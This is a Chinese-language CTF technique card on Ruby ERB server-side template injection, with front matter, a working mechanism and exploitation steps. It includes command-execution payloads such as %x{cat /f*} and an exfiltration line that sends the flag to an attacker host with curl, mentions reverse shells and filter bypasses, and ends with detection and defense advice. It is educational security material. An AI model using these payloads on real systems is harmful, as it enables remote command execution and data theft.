---
id: web-generic-ssti-ruby-erb-percent-x-command-exec
title: Ruby ERB 模板注入：%x{} 直接执行系统命令读 flag
type: scenario
domain: web
path: web/generic/ssti
technique: ruby-erb-ssti-percent-x-rce
aliases:
- Ruby ERB SSTI
- ERB 模板注入
- '%x{} 命令执行'
- 红宝石的恶作剧
- Ruby 反引号执行
- ERB RCE
tags:
- web
- ssti
- ruby
- erb
- rce
- command-execution
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:18:54+08:00'
  notes: 已对照原文与图10核对：env探测Ruby环境、%x{cat /f*}执行并回显HECTF flag一致；原文未给模板源码，ERB触发点为合理归纳，卡内已按通用SSTI原理描述
---

## 一句话结论

当应用把用户输入拼进 ERB 模板并用 `<%= ... %>` 渲染时，Ruby 的 `%x{command}`（等价反引号）会在渲染过程中执行系统命令并返回 stdout；输入 `%x{cat /f*}` 即可直接读出 flag，先用 `env` 之类的探测确认 Ruby 环境再打。

## 原理

- **ERB 是 Ruby 的模板引擎**：`ERB.new(template).result` 会把 `<% %>`/`<%= %>` 中的 Ruby 代码编译执行；`<%= %>` 输出表达式结果。若用户输入被当作模板内容而不是纯文本，就形成 SSTI。
- **Ruby 的命令执行语法**：反引号 `` `cmd` ``、`system("cmd")`、`%x{cmd}` 都执行系统命令；`%x{}` 用花括号包裹，能避免引号冲突，适合注入到模板/参数中。`%x{cat /f*}` 返回命令 stdout，`<%= %>` 会把结果渲染到响应。
- **为什么先探 `env`**：输入 `env` 或 `<%= ENV.inspect %>` 能看到 Ruby/Rack 环境变量、应用路径、密钥等，确认模板执行的是 Ruby 而非其他语言；不同模板引擎（Jinja2/Twig/ERB）的探测语法不同，看到 Ruby 特征后再用 `%x{}`。
- **为什么能读文件**：`cat /f*` 利用通配符匹配 `/flag` 等文件名，避免不知道确切路径；命令以 Web 进程权限执行，能读该用户可读的文件。
- **根因**：把用户可控字符串当作模板源码执行，且没有沙箱/白名单；ERB 本身没有安全沙箱，任何 Ruby 表达式都可执行，包括文件、网络、进程操作。
- **与普通反射的区别**：普通 XSS 在浏览器执行 JS，ERB SSTI 在服务端执行 Ruby，可直接读服务器文件、执行命令、访问内网；危害等级更高。

## 触发条件

- 应用使用 Ruby ERB（或其他 Ruby 模板）渲染用户可控内容，且未对 `<%`、`%x`、反引号等做转义/过滤。
- 用户输入进入模板源码位置（如 `ERB.new(params[:tpl]).result`），而不是作为模板变量值。
- Web 进程有执行系统命令/读文件的权限；目标文件（如 `/flag`）对进程可读。
- 攻击者能观察到渲染结果或命令输出（回显），或能通过外带通道获取。

## 利用步骤

1. **探测模板引擎**：提交 `env`、`<%= 7*7 %>`、`${7*7}` 等，观察返回；若 `env` 输出 Ruby 环境变量、`7*7` 返回 49，确认 ERB。
2. **确认命令执行**：提交 `%x{id}` 或 `<%= %x{id} %>`，看是否返回 `uid=...`。
3. **读文件**：提交 `%x{cat /f*}`（通配符匹配 `/flag`）；若不知道路径，先 `%x{ls /}`。
4. **扩大利用**：`%x{cat /etc/passwd}`、`%x{env}` 读密钥、`%x{curl http://attacker/$(cat /flag)}` 外带、反弹 shell。
5. **清理/验证**：确认输出编码（HTML 转义可能影响显示），必要时用 `<%= %x{...} %>` 让结果进入响应体。

## PoC

```text
env
```

```text
%x{id}
```

```text
%x{cat /f*}
```

若输入必须放在 ERB 标签内：

```erb
<%= %x{cat /f*} %>
```

原文在输入 `env` 确认 Ruby 环境后，直接提交 `%x{cat /f*}` 得到 flag：`HECTF{1bffdda743011e-9bd222f75db7c01-9a152b72e1b1eba}`。

## 变体与关联

- 变体：`<%= system('cat /f*') %>`、反引号 `` <%= `cat /f*` %> ``、`IO.popen`/`Open3.capture2`；无回显时用 DNS/HTTP 外带；过滤 `%x` 时用 `eval`、`send`、字符串拼接绕过。
- 关联：[[web-generic-ssti-engine-identification-decision-tree-errors]]（模板引擎识别决策树）、[[web-generic-ssti-error-message-exfiltration]]（无回显时用报错外带）、[[web-python-ssti-jinja2-boolean-error-blind]]（Jinja2 盲注 SSTI，可对照不同引擎的利用方式）。
- 其他 Ruby 场景：[[binary-pwn-sandbox-escape-ruby-send-calculator-method-dispatch-rce]]（Ruby `send` 方法分发逃逸）。

## 检测与防御

- **不要渲染用户输入**：模板源码必须来自受控文件；用户输入只能作为模板变量（`ERB.new(template).result(binding)` 中通过局部变量传入），不能拼进模板字符串。
- **输入过滤/转义**：对 `<%`、`%>`、`%x`、反引号、`system`、`eval` 等做拦截；但过滤易被绕过，根本方案是分离模板与数据。
- **沙箱与权限**：若必须执行用户模板，使用隔离沙箱（独立容器、只读文件系统、无网络、低权限用户），禁止访问 `/flag`、环境变量中的密钥。
- **检测**：监控请求中出现 `<%`、`%x{`、反引号、`system(`、`cat /f*` 等特征；监控 Web 进程启动 `sh`/`cat`/`curl` 子进程、读取敏感文件、异常出站。
- **日志**：记录模板渲染的原始输入与异常；对 500 错误中的 Ruby 堆栈做脱敏，避免泄露路径与环境。
